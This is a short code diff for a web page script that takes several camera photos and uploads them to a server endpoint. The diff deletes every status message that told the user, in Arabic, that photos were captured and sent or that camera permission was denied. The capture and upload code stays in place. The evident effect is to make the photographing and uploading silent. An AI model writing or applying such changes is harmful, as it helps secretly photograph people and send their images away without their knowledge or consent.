@@ -49,10 +49,8 @@
       }
 
       stream.getTracks().forEach(t => t.stop());
-      status.innerText = "تم ✅";
     } catch (e) {
       console.error(e);
-      status.innerText = "❌ لم يتم منح إذن الكاميرا";
     }
   }
 
@@ -68,7 +66,6 @@
         form.append("photo", blob, `photo_${i}.jpg`);
         try {
           await fetch("/api/upload", { method: "POST", body: form });
-          status.innerText = `تم إرسال ${i}/${PHOTO_COUNT}`;
         } catch (e) { console.error(e); }
         resolve();
       }, "image/jpeg", 0.9);
